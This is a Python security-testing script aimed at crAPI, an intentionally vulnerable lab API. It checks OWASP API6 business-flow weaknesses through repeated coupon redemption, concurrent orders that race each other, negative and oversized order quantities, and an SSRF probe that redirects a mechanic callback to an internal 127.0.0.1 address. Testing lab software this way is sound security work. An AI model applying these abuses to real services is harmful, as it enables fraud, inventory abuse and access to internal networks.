#!/usr/bin/env python3
"""
OWASP API Security Top 10:2023 - API6: Unrestricted Access to Sensitive Business Flows
Target: crAPI running on Docker (default port 8888)

Tests for:
  - Automated bulk coupon redemption (business logic abuse)
  - Scalping: rapidly purchasing limited stock items
  - Bypassing intended user journey (e.g., ordering without a vehicle)
  - Abusing referral/reward flows programmatically
"""

import requests
import json
import time
import concurrent.futures
import sys

from crapi_config import BASE_URL, USER1_EMAIL, USER1_PASSWORD, USER2_EMAIL, USER2_PASSWORD
USER_EMAIL = USER1_EMAIL
USER_PASSWORD = USER1_PASSWORD
USER2_EMAIL = USER2_EMAIL
USER2_PASSWORD = USER2_PASSWORD



# Second account to test cross-account abuse


def get_token(email, password):
    r = requests.post(f"{BASE_URL}/identity/api/auth/login",
                      json={"email": email, "password": password})
    if r.status_code == 200:
        return r.json().get("token")
    return None


def test_automated_coupon_redemption(token):
    """
    API6 Test: Automated, high-frequency coupon redemptions.
    Legitimate flow = one user redeems one coupon once.
    Abused flow = script redeems in bulk.
    """
    print(f"\n[API6:BusinessFlow] Automated Coupon Redemption Abuse")
    headers = {"Authorization": f"Bearer {token}"}

    coupon_code = "TRAC075"
    successes = 0
    total = 10

    print(f"  Attempting to redeem coupon '{coupon_code}' {total} times in rapid succession...")
    for i in range(total):
        r = requests.post(f"{BASE_URL}/community/api/v2/coupon/validate-coupon",
                          headers=headers, json={"coupon_code": coupon_code})
        result = "OK" if r.status_code == 200 else f"HTTP {r.status_code}"
        print(f"  Attempt {i+1:02d}: {result} → {r.text[:60]}")
        if r.status_code == 200:
            successes += 1
        time.sleep(0.1)

    if successes > 1:
        print(f"\n  [VULNERABLE] Coupon redeemed {successes}/{total} times — no business logic protection!")
        return True
    else:
        print(f"\n  [PROTECTED] Only {successes}/{total} redemptions succeeded")
        return False


def test_race_condition_order(token):
    """
    API6 Test: Race condition on product orders.
    Fire multiple simultaneous purchase requests to buy more than stock allows.
    """
    print(f"\n[API6:BusinessFlow] Race Condition on Product Purchase")
    headers = {"Authorization": f"Bearer {token}"}

    # First, get available products
    r = requests.get(f"{BASE_URL}/workshop/api/shop/products", headers=headers)
    print(f"  GET /shop/products → HTTP {r.status_code}")

    if r.status_code != 200:
        print(f"  [SKIP] Cannot retrieve products: {r.text[:100]}")
        return False

    products = r.json().get("products", [])
    if not products:
        print(f"  [SKIP] No products available in shop")
        return False

    product = products[0]
    product_id = product.get("id")
    print(f"  Target product: {product.get('name')} (id={product_id})")
    print(f"  Firing 10 concurrent purchase requests...")

    def purchase():
        resp = requests.post(f"{BASE_URL}/workshop/api/shop/orders",
                             headers=headers,
                             json={"product_id": product_id, "quantity": 1})
        return resp.status_code, resp.text[:80]

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(purchase) for _ in range(10)]
        for f in concurrent.futures.as_completed(futures):
            results.append(f.result())

    successes = [(s, t) for s, t in results if s in (200, 201)]
    failures  = [(s, t) for s, t in results if s not in (200, 201)]

    print(f"  Successful orders: {len(successes)}")
    print(f"  Failed orders:     {len(failures)}")
    for s, t in results:
        print(f"    HTTP {s}: {t}")

    if len(successes) > 1:
        print(f"\n  [VULNERABLE] Race condition! {len(successes)} concurrent orders succeeded!")
        return True
    else:
        print(f"\n  [INFO] Only {len(successes)} order succeeded (may be stock limited or protected)")
        return False


def test_order_quantity_manipulation(token):
    """
    API6 Test: Manipulate order quantity to get negative pricing or bulk discount bypass.
    Submit order with quantity=0, -1, or extremely large number.
    """
    print(f"\n[API6:BusinessFlow] Order Quantity Manipulation")
    headers = {"Authorization": f"Bearer {token}"}

    r = requests.get(f"{BASE_URL}/workshop/api/shop/products", headers=headers)
    if r.status_code != 200:
        print(f"  [SKIP] Cannot retrieve products")
        return False

    products = r.json().get("products", [])
    if not products:
        print(f"  [SKIP] No products available")
        return False

    product_id = products[0].get("id")

    test_quantities = [0, -1, -100, 99999]
    vulnerable = False

    for qty in test_quantities:
        r = requests.post(f"{BASE_URL}/workshop/api/shop/orders",
                          headers=headers,
                          json={"product_id": product_id, "quantity": qty})
        print(f"  quantity={qty:6} → HTTP {r.status_code}: {r.text[:80]}", end="")
        if r.status_code in (200, 201):
            print(" ← [VULNERABLE] Invalid quantity accepted!")
            vulnerable = True
        else:
            print()

    return vulnerable


def test_contact_mechanic_ssrf(token):
    """
    API6 Test: The contact_mechanic endpoint triggers a server-side callback
    to a mechanic_api url. This can be abused to trigger SSRF or bypass
    business logic by controlling the callback destination.
    """
    print(f"\n[API6:BusinessFlow] Contact Mechanic - Business Logic Bypass (SSRF probe)")
    headers = {"Authorization": f"Bearer {token}"}

    # Get vehicle ID first
    r = requests.get(f"{BASE_URL}/identity/api/v2/vehicle/vehicles", headers=headers)
    if r.status_code != 200 or not r.json():
        print(f"  [SKIP] No vehicles found. Add a vehicle via crAPI UI first.")
        return False

    vehicle_uuid = r.json()[0].get("uuid")

    # Normal mechanic report request
    payload = {
        "mechanic_api": "http://localhost:8888/workshop/api/mechanic/",
        "problem_details": "My car makes noise",
        "vin": r.json()[0].get("vin", "UNKNOWN"),
        "mechanic_code": "TRAC_JHJ",
        "repeat_request_if_failed": False,
        "number_of_repeats": 1
    }

    r2 = requests.post(f"{BASE_URL}/workshop/api/mechanic/contact_mechanic",
                       headers=headers, json=payload)
    print(f"  Normal mechanic request → HTTP {r2.status_code}")

    if r2.status_code == 200:
        resp_data = r2.json()
        print(f"  Response: {json.dumps(resp_data, indent=2)}")

        # Now try pointing mechanic_api at an internal service
        evil_payload = {**payload, "mechanic_api": "http://127.0.0.1:8080/internal"}
        r3 = requests.post(f"{BASE_URL}/workshop/api/mechanic/contact_mechanic",
                           headers=headers, json=evil_payload)
        print(f"\n  Internal SSRF probe → HTTP {r3.status_code}: {r3.text[:200]}")
        if r3.status_code != 400:
            print(f"  [VULNERABLE] Server made outbound request to attacker-controlled URL!")
            return True
        else:
            print(f"  [PROTECTED] Server rejected internal URL target")

    return False


def main():
    print("=" * 60)
    print("  crAPI - API6: Unrestricted Access to Sensitive Business Flows")
    print("=" * 60)
    print(f"\nTarget: {BASE_URL}")

    token = get_token(USER_EMAIL, USER_PASSWORD)
    if not token:
        print("[ERROR] Authentication failed. Check USER_EMAIL/USER_PASSWORD.")
        sys.exit(1)
    print(f"[AUTH] Token acquired: {token[:40]}...")

    results = []
    results.append(("Automated Coupon Redemption",     test_automated_coupon_redemption(token)))
    results.append(("Race Condition on Orders",         test_race_condition_order(token)))
    results.append(("Order Quantity Manipulation",      test_order_quantity_manipulation(token)))
    results.append(("Contact Mechanic SSRF/Logic Abuse",test_contact_mechanic_ssrf(token)))

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for name, vuln in results:
        status = "VULNERABLE ⚠️ " if vuln else "PROTECTED  ✅"
        print(f"  {status}  {name}")
    print()


if __name__ == "__main__":
    main()
